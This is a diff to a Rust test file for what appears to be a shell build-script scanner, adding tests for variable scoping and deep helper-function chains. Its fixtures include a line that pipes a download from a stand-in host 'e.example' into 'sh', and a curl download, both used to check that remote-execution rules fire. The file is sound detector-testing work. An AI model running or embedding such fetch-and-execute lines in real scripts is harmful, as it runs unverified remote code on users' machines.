@@ -80,12 +80,30 @@ async fn top_level_variable_assigned_after_the_function_still_applies() {
 #[tokio::test]
 async fn function_local_variable_does_not_leak_into_another_function() {
     let f = scan(
-        "build() {\n  c=curl\n  true\n}\npackage() {\n  $c -s http://e.example/x | sh\n}",
+        "build() {\n  local c=curl\n  true\n}\npackage() {\n  $c -s http://e.example/x | sh\n}",
         None,
     )
     .await;
     assert!(!has(&f, "DLE-001"), "local var must not leak: {f:?}");
     assert!(!has(&f, "EXEC-REMOTE"), "local var must not leak: {f:?}");
+}
+
+#[tokio::test]
+async fn long_helper_chain_still_reports_func001_and_uncalled_one_does_not() {
+    let mut chain = String::new();
+    for i in 1..10 {
+        chain.push_str(&format!("c{i}() {{ c{}; }}\n", i + 1));
+    }
+    chain.push_str("c10() { curl http://e.example/x -o /tmp/x; }\n");
+    let called = format!("{chain}package() {{\n  c1\n}}");
+    let f = scan(&called, None).await;
+    assert!(has(&f, "FUNC-001"), "10-deep chain must report: {f:?}");
+    let uncalled = format!("{chain}package() {{\n  true\n}}");
+    let f = scan(&uncalled, None).await;
+    assert!(
+        !has(&f, "FUNC-001"),
+        "uncalled chain must stay quiet: {f:?}"
+    );
 }
 
 #[tokio::test]
